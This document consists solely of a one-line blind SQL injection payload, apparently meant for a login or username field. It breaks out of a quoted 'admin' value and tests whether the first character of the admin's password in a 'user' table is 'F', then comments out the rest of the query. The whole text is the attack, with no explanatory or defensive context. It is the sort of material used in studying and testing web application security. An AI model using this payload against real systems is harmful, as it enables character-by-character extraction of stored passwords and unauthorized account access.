admin' AND  substr((SELECT pass FROM user WHERE id='admin'),1,1) = 'F'; --
